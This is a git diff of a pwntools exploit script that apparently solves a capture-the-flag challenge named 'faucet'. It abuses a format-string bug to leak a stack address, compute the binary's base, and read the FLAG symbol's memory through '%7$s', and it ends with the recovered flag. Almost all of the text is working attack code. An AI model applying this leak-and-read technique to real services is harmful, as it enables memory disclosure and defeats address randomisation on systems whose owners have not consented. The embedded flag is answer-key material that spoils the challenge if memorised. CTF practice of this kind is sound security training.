@@ -2,41 +2,37 @@ from pwn import *
 
 context.binary = elf = ELF("faucet")
 
-r = remote("challenge.ctf.games", 32029)
+r = remote("challenge.ctf.games", 31517)
 r.recvuntil("a hammer")
-# 6
-r.sendlineafter(">", b"5")
-r.sendline("AAAABBBB %6$p")
-r.recvuntil("a ")
-print(r.recvuntil("\n", drop = True).decode())
 
+# print out main addr
 r.sendlineafter(">", b"5")
 r.sendline("%21$lx")
 r.recvuntil("a ")
 ret = int(r.recvuntil("\n", drop = True).decode(), 16)
+print("Main memory addr: ", hex(ret))
 
-print(hex(ret))
-
+# calculating base address
 elf.address = ret - elf.symbols.main
-print(hex(elf.address))
+print("Base addr: ", hex(elf.address))
 
-padding = b'A' * 8 # to shift the addr down by 1 stack position, cant print flag in one go as there is null byte in the addr, which acts as string terminator
-payload = padding + p64(elf.symbols.FLAG)
+# first payload
+payload = b'A' * 8
+payload += p64(elf.symbols.FLAG)
 
-print(hex(elf.symbols.FLAG))
-print(payload)
+print("FLAG addr: ", hex(elf.symbols.FLAG))
 
+# send payload to store FLAG address at stack location 7
 r.sendlineafter(">", b"5")
 r.sendline(payload)
 
-# to access the addressed passed and peek at its content
-r.sendlineafter(">", b"5")
-r.sendline("%7$s")
-r.recvuntil("a ")
-print()
-print(r.recvuntil("\n", drop = True).decode())
-print()
+# second round payload to print the flag
+payload2 = b'%7$s'
 
-r.close()
-    
+# send payload to print the flag
+r.sendlineafter(">", b"5")
+r.sendline(payload2)
+
+r.interactive()
+
 # flag{6bc75f21f8839ce0db898a1950d11ccf}
